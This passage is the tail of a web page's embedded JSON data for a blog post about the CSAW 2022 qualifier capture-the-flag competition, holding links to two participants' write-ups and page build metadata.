Adam](https://4n6nk8s.tech/2022/09/12/Writeups/csaw2022/?fbclid=IwAR2lkfD8gD6AggLv-c1P_tFP1PdK607fKFf4Rg5Ozi597A6lHdKlfM80wsw)\n- [Ironbyte](https://l.facebook.com/l.php?u=https%3A%2F%2Fironbyte.me%2Fezmaze%2F%3Ffbclid%3DIwAR1UWnHRheApKCK7MtfcN_6lOBeSLEecT5NLBSETDwITNu-6bNPCnw497uA\u0026h=AT14Q4UItbyzfDyj05vOBfFIIKwME3bO40gyNJOqD3UR4a2bex6wsRTEk26B9c6GQdjVbxako_OZtruE3LkafzkaiL_aXfDFmo0W0RiOwke5hiQxeQMt1sFjz7zYx2nkUAy8Gw)"}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"csaw-quals-2k22.md"},"buildId":"cFnxefjEU55VHjGAEuNKp","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>